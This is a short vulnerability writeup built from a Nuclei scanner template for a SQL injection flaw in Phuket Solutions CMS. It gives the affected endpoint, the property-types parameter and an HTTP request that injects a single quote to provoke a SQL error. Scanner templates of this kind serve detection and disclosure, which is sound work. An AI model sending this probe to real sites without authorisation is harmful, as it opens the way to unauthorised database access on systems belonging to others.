# Nuclei Template: Phuket Solution CMS - SQL Injection
**Template ID:** phuket-cms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`phuket-cms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Phuket Solutions CMS is vulnerable to sql injection in which an attacker is able to manipulate an SQL query through user input, causing the application to execute unintended SQL code.

## Steps to reproduce / Exploit Payload
```http
GET /properties-list.php HTTP/1.1
Host: {{Hostname}}

GET /properties-list.php?property-types=%27 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploitalert.com/view-details.html?id=36234
